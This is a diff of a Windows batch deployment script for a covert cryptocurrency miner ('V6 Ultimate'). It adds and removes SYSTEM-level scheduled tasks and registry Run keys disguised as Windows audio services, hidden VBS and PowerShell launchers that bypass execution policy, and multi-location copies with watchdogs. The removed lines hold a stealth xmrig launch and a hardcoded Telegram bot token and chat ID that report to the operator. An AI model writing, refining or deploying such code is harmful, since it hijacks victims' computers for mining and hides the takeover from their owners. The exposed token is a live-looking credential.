@@ -105,18 +105,16 @@ for %%L in (%LOCATIONS%) do (
     call :create_watchdog "%%L"
 )
 
-REM === Advanced Persistence Layer ===
-REM Layer 1: Multiple Scheduled Tasks
-for %%i in (1 2 3 4 5) do (
-    schtasks /create /tn "WindowsAudioSrv%%i" /tr "wscript.exe \"%LOC%%i%\run_silent.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
-    schtasks /create /tn "SystemHost%%i" /tr "wscript.exe \"%LOC%%i%\run_silent.vbs\"" /sc daily /st 00:0%%i /ru SYSTEM /rl HIGHEST /f >nul 2>&1
-    schtasks /create /tn "AudioEndpoint%%i" /tr "wscript.exe \"%LOC%%i%\run_silent.vbs\"" /sc onidle /i 3%%i /ru SYSTEM /rl HIGHEST /f >nul 2>&1
-)
+REM === Advanced Persistence Layer - Single Instance System ===
+REM Layer 1: Multiple Scheduled Tasks for Single Instance Manager
+schtasks /create /tn "WindowsAudioSrv" /tr "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+schtasks /create /tn "SystemHostAudio" /tr "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+schtasks /create /tn "AudioEndpointSrv" /tr "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /sc daily /st 09:00 /ru SYSTEM /rl HIGHEST /f >nul 2>&1
 
-REM Layer 2: Registry Startup (Multiple Locations)
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioSrv" /t REG_SZ /d "wscript.exe \"%LOC1%\run_silent.vbs\"" /f >nul
-reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run" /v "SystemAudioHost" /t REG_SZ /d "wscript.exe \"%LOC2%\run_silent.vbs\"" /f >nul
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AudioEndpointBuilder" /t REG_SZ /d "wscript.exe \"%LOC3%\run_silent.vbs\"" /f >nul
+REM Layer 2: Registry Startup for Single Instance
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioService" /t REG_SZ /d "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /f >nul
+reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run" /v "SystemAudioHost" /t REG_SZ /d "wscript.exe \"%LOC2%\invisible_startup.vbs\"" /f >nul
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AudioEndpointBuilder" /t REG_SZ /d "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /f >nul
 
 REM Layer 3: Windows Services with Recovery
 for %%i in (1 2 3) do (
@@ -172,23 +170,22 @@ echo WshShell.Run Chr(34) ^& "%LOC1%\cross_monitor.bat" ^& Chr(34), 0, False >> 
 REM Schedule cross monitor
 schtasks /create /tn "WindowsCrossMonitor" /tr "wscript.exe \"%LOC1%\cross_monitor.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
 
-REM === Deploy Telegram Monitor ===
-xcopy /Y /Q "%~dp0miner_monitor.ps1" "%LOC1%\" >nul 2>&1
-xcopy /Y /Q "%~dp0miner_monitor.ps1" "%LOC2%\" >nul 2>&1
+REM === Deploy Single Instance Manager ===
+xcopy /Y /Q "%~dp0single_instance_manager.ps1" "%LOC1%\" >nul 2>&1
+xcopy /Y /Q "%~dp0single_instance_manager.ps1" "%LOC2%\" >nul 2>&1
+xcopy /Y /Q "%~dp0invisible_launch.vbs" "%LOC1%\" >nul 2>&1
+xcopy /Y /Q "%~dp0invisible_launch.vbs" "%LOC2%\" >nul 2>&1
 
-REM === Create Monitor Launcher ===
+REM === Create Invisible Startup Launcher ===
 (
-echo @echo off
-echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%LOC1%\miner_monitor.ps1" -TelegramToken "7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE" -ChatID "8112985977" -Startup
-) > "%LOC1%\start_monitor.bat"
+echo Set WshShell = CreateObject("WScript.Shell"^)
+echo WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""^& '%LOC1%\single_instance_manager.ps1' -Startup""", 0, False
+) > "%LOC1%\invisible_startup.vbs"
 
 (
-echo @echo off
-echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%LOC1%\miner_monitor.ps1" -TelegramToken "7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE" -ChatID "8112985977" -IntervalMinutes 7
-) > "%LOC1%\monitor_service.bat"
-
-echo Set WshShell = CreateObject("WScript.Shell") > "%LOC1%\monitor.vbs"
-echo WshShell.Run Chr(34) ^& "%LOC1%\monitor_service.bat" ^& Chr(34), 0, False >> "%LOC1%\monitor.vbs"
+echo Set WshShell = CreateObject("WScript.Shell"^)
+echo WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""^& '%LOC1%\single_instance_manager.ps1' -Monitor""", 0, False
+) > "%LOC1%\invisible_monitor.vbs"
 
 REM === Schedule Telegram Monitor ===
 schtasks /create /tn "WindowsMonitorSrv" /tr "wscript.exe \"%LOC1%\monitor.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
@@ -201,11 +198,8 @@ for %%L in (%LOCATIONS%) do (
     )
 )
 
-REM === Initial Stealth Launch ===
-start "" /min "%LOC1%\xmrig.exe" --config="%LOC1%\config.json" >nul 2>&1
-
-REM === Start Monitor (with startup notification) ===
-start "" /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%LOC1%\miner_monitor.ps1" -Startup >nul 2>&1
+REM === Start Single Instance Manager ===
+start "" /min wscript.exe "%LOC1%\invisible_startup.vbs" >nul 2>&1
 
 echo [SUCCESS] V6 Ultimate deployment completed
 echo [INFO] Deployed to 5 locations with cross-monitoring
